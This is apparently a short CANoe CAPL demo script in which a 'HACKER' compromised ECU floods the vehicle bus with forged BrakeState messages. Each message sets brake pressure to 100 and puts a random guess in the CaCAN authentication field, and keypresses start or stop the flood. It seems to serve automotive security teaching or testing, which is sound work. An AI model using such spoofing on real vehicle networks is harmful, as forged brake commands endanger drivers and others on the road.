/*@!Encoding:1252*/

variables
{
  message BrakeState msg_BrakeState;
  mstimer t;
  int tdelay=5;
}

on start
{
   write("HACKER: Hello World, I am a compromised ECU.");
}

on key 'h'
{
  write("HACKER: Sending manipulated CAN messages.");
  settimer(t,tdelay);
}

on key 'c'
{
  write("HACKER: Stopped manipulated CAN messages.");
  cancelTimer(t);
  msg_BrakeState.BrakePressure = 0;
  output(msg_BrakeState);
}

on timer t{
  msg_BrakeState.BrakePressure = 100;
  msg_BrakeState.CaCAN_Auth = random(256);
  output(msg_BrakeState);
  settimer(t,tdelay);
}